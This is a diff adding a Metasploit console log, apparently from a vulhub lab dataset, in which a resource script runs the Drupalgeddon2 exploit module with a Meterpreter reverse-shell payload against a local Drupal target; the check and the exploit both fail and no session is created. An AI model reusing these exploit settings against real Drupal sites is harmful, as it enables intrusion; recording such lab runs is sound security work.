@@ -1,0 +1,30 @@
+[*] Processing /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/run.rc for ERB directives.
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/run.rc)> spool /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/scan.stdout
+[*] Spooling to file /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/scan.stdout...
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/run.rc)> use exploit/unix/webapp/drupal_drupalgeddon2
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/run.rc)> set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/run.rc)> set RPORT 18022
+RPORT => 18022
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/run.rc)> set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/run.rc)> set TARGETURI /
+TARGETURI => /
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/run.rc)> set SSL false
+SSL => false
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/run.rc)> set VERBOSE true
+VERBOSE => true
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/run.rc)> check
+[-] Could not determine Drupal version to target
+[*] 127.0.0.1:18022 - Cannot reliably check exploitability. Could not determine the target status
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/run.rc)> run
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[-] Could not determine Drupal version to target
+[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. Could not determine the target status "set ForceExploit true" to override check result.
+[*] Exploit completed, but no session was created.
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/run.rc)> spool off
+[*] Spooling is now disabled
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/drupal_7602/run.rc)> exit
